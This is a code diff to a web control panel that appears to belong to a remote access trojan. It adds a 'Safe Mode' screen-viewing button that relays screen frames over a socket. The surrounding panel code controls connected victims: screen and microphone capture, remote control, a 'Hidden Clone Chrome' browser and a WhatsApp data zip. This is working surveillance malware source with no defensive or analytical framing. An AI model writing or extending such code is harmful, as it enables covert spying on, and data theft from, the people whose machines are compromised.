@@ -19,6 +19,7 @@
     <div id="clientsList" class="clients"></div>
     <div id="controls" class="hidden" style="margin-top: 15px;">
         <button id="viewScreenBtn" style="background: #28a745;">🖥️ View Screen</button>
+        <button id="viewScreenSafeBtn" style="background: #17a2b8;">🛡️ View Screen (Safe Mode)</button>
         <button id="viewScreenMicBtn" style="background: #e83e8c;">🖥️+🎙️ Screen & Mic</button>
         <button id="remoteControlBtn" style="background: #dc3545;">🎮 Remote Control</button>
         <button id="viewChromeBtn" style="background: #ff7300;">🌐 Chrome Browsers</button>
@@ -177,6 +178,10 @@
                 peerConnection = null;
                 document.getElementById('preview-video').srcObject = null;
                 document.getElementById('preview-video').classList.add('hidden');
+            } else if (activeType === 'screen-safe') {
+                socket.emit('stop-screen-safe', activeTarget);
+                document.getElementById('hidden-chrome-img').src = "";
+                document.getElementById('hidden-chrome-img').classList.add('hidden');
             } else if (activeType === 'camera') {
                 socket.emit('stop-camera', activeTarget);
                 if (peerConnection) peerConnection.close();
@@ -201,6 +206,7 @@
             }
         }
 
+        // Toggle buttons logic
         document.getElementById('viewScreenBtn').onclick = () => {
             if (activeType === 'screen') return;
             stopCurrentActive();
@@ -209,6 +215,17 @@
             document.getElementById('preview-video').muted = false;
             document.getElementById('title').innerText = "Viewing Screen: " + activeTarget + " [Connecting...]";
             socket.emit('request-screen', activeTarget);
+        };
+
+        document.getElementById('viewScreenSafeBtn').onclick = () => {
+            if (activeType === 'screen-safe') return;
+            stopCurrentActive();
+            activeType = 'screen-safe';
+            // Safe mode uses the IMG tag instead of Video!
+            document.getElementById('hidden-chrome-img').classList.remove('hidden');
+            document.getElementById('hidden-chrome-img').src = "";
+            document.getElementById('title').innerText = "Viewing Screen (Safe Mode via Socket Relay): " + activeTarget;
+            socket.emit('request-screen-safe', activeTarget);
         };
 
         document.getElementById('viewScreenMicBtn').onclick = () => {
@@ -383,6 +400,11 @@
             if (document.getElementById('title').innerText.includes("Starting")) {
                 document.getElementById('title').innerText = "Hidden Clone Chrome: " + activeTarget;
             }
+        });
+
+        socket.on('screen-safe-frame', (frameBase64) => {
+            if (activeType !== 'screen-safe') return;
+            document.getElementById('hidden-chrome-img').src = frameBase64;
         });
 
         socket.on('whatsapp-zip-ready', (data) => {
